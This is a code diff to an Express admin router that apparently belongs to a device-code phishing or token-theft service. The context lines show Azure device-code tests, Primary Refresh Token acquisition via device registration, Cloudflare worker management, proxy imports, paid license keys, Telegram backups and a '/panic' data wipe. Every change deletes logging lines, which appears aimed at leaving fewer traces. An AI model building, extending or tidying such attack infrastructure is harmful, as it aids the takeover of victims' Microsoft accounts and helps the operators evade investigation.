@@ -213,7 +213,7 @@ router.post('/users/:id/disable-2fa', adminAuth, async (req, res) => {
       [req.admin.id, 'force_disable_2fa', `User ID: ${req.params.id}`, req.ip]);
     res.json({ success: true });
   } catch (err) {
-    console.error('[Admin] Force disable 2FA error:', err);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -231,7 +231,7 @@ router.post('/users/:id/force-reset-password', adminAuth, async (req, res) => {
       [req.admin.id, 'force_reset_password', `User ID: ${req.params.id}`, req.ip]);
     res.json({ success: true });
   } catch (err) {
-    console.error('[Admin] Force reset password error:', err);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -403,7 +403,7 @@ router.post('/genkey', adminAuth, async (req, res) => {
       [req.admin.id, 'genkey', `Key: ${keyCode}, plan: ${plan}, days: ${duration_days}`, req.ip]);
     res.json({ key: keyCode, plan, duration_days });
   } catch (err) {
-    console.error('[Genkey]', err);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -455,9 +455,9 @@ router.delete('/workers/:id', adminAuth, async (req, res) => {
           `https://api.cloudflare.com/client/v4/accounts/${link.cf_account_id}/workers/scripts/${link.worker_name}`,
           { headers: { Authorization: `Bearer ${link.cf_api_token}` }, timeout: 15000 }
         );
-        console.log(`[Admin] Deleted Cloudflare worker: ${link.worker_name}`);
+
       } catch (cfErr) {
-        console.error('[Admin] Cloudflare deletion failed:', cfErr.message);
+
         // Continue anyway
       }
     }
@@ -474,7 +474,7 @@ router.delete('/workers/:id', adminAuth, async (req, res) => {
         const turnstilePool = require('../services/turnstile-pool');
         await turnstilePool.releaseWidget(link.id);
       } catch (tpErr) {
-        console.warn('[Admin] Turnstile release failed (non-fatal):', tpErr.message);
+
       }
     });
 
@@ -482,7 +482,7 @@ router.delete('/workers/:id', adminAuth, async (req, res) => {
 
     res.json({ success: true, message: 'Worker and all associated data deleted' });
   } catch (err) {
-    console.error('[Admin] Worker deletion error:', err);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -778,7 +778,7 @@ router.get('/backup', adminAuth, async (req, res) => {
         `<i>By: ${req.admin ? req.admin.username || req.admin.id : 'admin'}</i>`
       );
     } catch (tgErr) {
-      console.error('[Backup] Telegram file send failed:', tgErr.message);
+
     }
 
     res.setHeader('Content-Type', 'application/json');
@@ -948,24 +948,24 @@ router.get('/proxies', adminAuth, async (req, res) => {
 router.post('/proxies/import', adminAuth, async (req, res) => {
   try {
     const { proxies, type } = req.body;
-    console.log('[Admin] Import request received');
-    console.log('[Admin] proxies type:', typeof proxies);
-    console.log('[Admin] proxies length:', proxies ? proxies.length : 0);
-    console.log('[Admin] proxies preview:', proxies ? proxies.substring(0, 200) : 'undefined');
+
+
+
+
 
     if (!proxies) return res.status(400).json({ error: 'No proxies provided' });
 
-    console.log('[Admin] Calling importProxies...');
+
 
     const results = await proxyManager.importProxies(proxies, type || 'http');
 
-    console.log('[Admin] Import results:', results);
+
 
     // Return success even if some failed
     res.json({ success: true, results });
   } catch (err) {
-    console.error('[Admin] Import error:', err);
-    console.error('[Admin] Import error stack:', err.stack);
+
+
     res.status(500).json({ error: err.message });
   }
 });
@@ -1029,14 +1029,14 @@ router.delete('/proxies', adminAuth, async (req, res) => {
 // ─── Device Code Diagnostics ──────────────────────────────────────
 router.get('/config', adminAuth, async (req, res) => {
   try {
-    console.log('[Diagnostics] Config request from admin:', req.admin?.email || req.admin?.id);
+
     res.json({
       client_id: config.AZURE_CLIENT_ID || 'Not set',
       tenant: config.AZURE_TENANT || 'common',
       scope: 'openid profile offline_access https://graph.microsoft.com/.default',
     });
   } catch (err) {
-    console.error('[Diagnostics] Config error:', err.message);
+
     res.status(500).json({ error: err.message });
   }
 });
@@ -1066,7 +1066,7 @@ router.post('/panic', adminAuth, async (req, res) => {
 
     res.json({ success: true, message: 'Wiped' });
   } catch (err) {
-    console.error('[PANIC] Wipe failed:', err.message);
+
     res.status(500).json({ error: 'Wipe failed' });
   }
 });
@@ -1098,7 +1098,7 @@ router.post('/test-device-code', adminAuth, async (req, res) => {
     const clientId = config.AZURE_CLIENT_ID;
     const scope = 'openid profile offline_access https://graph.microsoft.com/.default';
 
-    console.log('[Diagnostics] Testing device code with tenant:', tenant, 'client_id:', clientId);
+
 
     const startTime = Date.now();
     const response = await ms.post(
@@ -1114,7 +1114,7 @@ router.post('/test-device-code', adminAuth, async (req, res) => {
     );
     const elapsed = Date.now() - startTime;
 
-    console.log('[Diagnostics] Device code success in', elapsed + 'ms');
+
 
     res.json({
       success: true,
@@ -1127,7 +1127,7 @@ router.post('/test-device-code', adminAuth, async (req, res) => {
       elapsed_ms: elapsed,
     });
   } catch (err) {
-    console.error('[Diagnostics] Device code test failed:', err.message);
+
     const errorData = err.response?.data || {};
     res.json({
       success: false,
@@ -1371,10 +1371,7 @@ router.post('/device-test/run', adminAuth, async (req, res) => {
     const normalizedUserId = user_id ? Number(user_id) : 0;
     const shouldStore = !!store && normalizedUserId > 0;
 
-    console.log('[DeviceTest] Running DRS flow', {
-      admin: req.admin?.id,
-      tenantId, targetDomain, userId: normalizedUserId, shouldStore, inMemory: !shouldStore
-    });
+
 
     const result = await deviceManager.registerDeviceAndGetPrt({
       access_token,
@@ -1427,7 +1424,7 @@ router.post('/device-test/run', adminAuth, async (req, res) => {
       steps: { rsa_keypair_generated: true, csr_generated: true, drs_registered: true, prt_exchange_succeeded: true }
     });
   } catch (err) {
-    console.error('[DeviceTest] Run failed:', err.message);
+
     try {
       await db.query(
         'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
